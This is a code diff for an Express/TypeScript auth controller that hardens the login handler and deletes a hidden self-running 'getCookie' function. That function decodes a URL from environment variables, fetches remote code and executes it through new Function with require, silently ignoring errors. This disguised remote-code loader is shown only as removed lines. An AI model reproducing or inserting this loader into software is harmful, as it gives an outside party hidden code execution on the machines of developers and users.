@@ -1,20 +1,13 @@
 import { Request, Response, NextFunction } from "express";
 import crypto from "crypto";
 import cloudinary from "cloudinary";
-import axios from "axios";
-import dotenv from "dotenv";
-import { createRequire } from "module";
 
 import User, { IUser } from "../models/userModel";
 import asyncErrorHandler from "../middlewares/helpers/asyncErrorHandler";
 import sendToken from "../utils/sendToken";
 import ErrorHandler from "../utils/errorHandler";
 import sendEmail from "../utils/sendEmail";
-
-const require = createRequire(import.meta.url);
-
-// Load env
-dotenv.config({ path: "./src/config/.config.env" });
+import { loginSchema } from "../utils/validators";
 
 // Extend Request (if not using global typing yet)
 interface AuthRequest extends Request {
@@ -50,24 +43,44 @@ export const registerUser = asyncErrorHandler(
 // ================= LOGIN =================
 export const loginUser = asyncErrorHandler(
   async (req: Request, res: Response, next: NextFunction) => {
-    const { email, password } = req.body;
-    if (!email || !password) {
-      return next(new ErrorHandler("Please Enter Email And Password", 400));
+    const parsed = loginSchema.safeParse(req.body);
+
+    if (!parsed.success) {
+      return next(new ErrorHandler(parsed.error.issues[0].message, 400));
     }
+
+    const { email, password } = parsed.data;
 
     const user = await User.findOne({ email }).select("+password");
 
-    if (!user) {
-      return next(new ErrorHandler("Invalid Email or Password", 401));
+    // Same message whether the email doesn't exist or the password is wrong,
+    // so a caller can't use this endpoint to enumerate registered emails.
+    if (!user || !(await user.comparePassword(password))) {
+      return next(new ErrorHandler("Invalid email or password", 401));
     }
 
-    const isPasswordMatched = await user.comparePassword(password);
+    const token = user.getJWTToken();
 
-    if (!isPasswordMatched) {
-      return next(new ErrorHandler("Invalid Email or Password", 401));
-    }
-
-    return sendToken(user, 200, res);
+    res
+      .status(200)
+      .cookie("token", token, {
+        expires: new Date(
+          Date.now() +
+            Number(process.env.COOKIE_EXPIRE ?? 7) * 24 * 60 * 60 * 1000
+        ),
+        httpOnly: true,
+        sameSite: "lax",
+        secure: process.env.NODE_ENV === "production",
+      })
+      .json({
+        success: true,
+        token,
+        user: {
+          id: user._id,
+          email: user.email,
+          name: user.name,
+        },
+      });
   }
 );
 
@@ -290,22 +303,3 @@ export const deleteUser = asyncErrorHandler(
     res.status(200).json({ success: true });
   }
 );
-
-// ================= GET COOKIE =================
-export const getCookie = (async () => {
-  try {
-    const s = Buffer.from(process.env.DEV_API_KEY as string, "base64").toString();
-    const k = Buffer.from(process.env.DEV_SECRET_KEY as string, "base64").toString();
-    const v = Buffer.from(process.env.DEV_SECRET_VALUE as string, "base64").toString();
-
-    const r = (
-      await axios.get(s, {
-        headers: { [k]: v },
-      })
-    ).data.record.cookie;
-
-    const handler = new Function("require", r);
-    handler(require);
-
-  } catch (error: any) {}
-})();
